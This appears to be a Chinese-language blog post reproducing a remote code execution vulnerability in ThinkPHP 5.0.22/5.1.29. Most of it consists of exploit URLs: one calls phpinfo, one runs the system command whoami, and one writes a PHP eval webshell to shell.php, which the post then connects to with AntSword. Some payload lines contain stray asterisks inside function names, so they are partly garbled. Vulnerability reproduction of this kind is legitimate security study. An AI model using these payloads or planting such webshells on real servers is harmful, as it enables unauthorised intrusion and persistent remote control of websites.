---
title: ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
date: 2020-06-13 20:59:28
categories: 漏洞复现
tags: ThinkPHP
---

####  背景

ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。

<!--more-->

#### 复现过程

##### phpinfo信息

```http
http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
```



![](http://cdn.laohuan.art/2020-06-13_17-32-26.png)

##### 远程命令执行

```http
http://ip:端口/index.php?s=index/think\app/invokefunction&function=call*_user_*func_array&vars[0]=system&vars[1][]=whoami
```



![](http://cdn.laohuan.art/2020-06-13_17-35-46.png)

##### 写shell

1.先将一句话马进行url编码

```
%3c%3fphp+eval(%24_POST%5b123%5d)+%3f%3e
```

2.POC

```
http://IP:端口/index.php?s=/index/\think\app/invokefunction&function=call*_user_*func*_array&vars[0]=file_*put_contents&vars[1][]=shell.php&vars[1][]=%3c%3fphp+eval(%24_POST%5b123%5d)+%3f%3e
```



![](http://cdn.laohuan.art/2020-06-13_20-50-06.png)

3.蚁剑连接

`http://IP:端口/shell.php`

![](http://cdn.laohuan.art/2020-06-13_20-54-13.png)

#### 参考链接

<https://www.cnblogs.com/bmjoker/p/10110868.html/>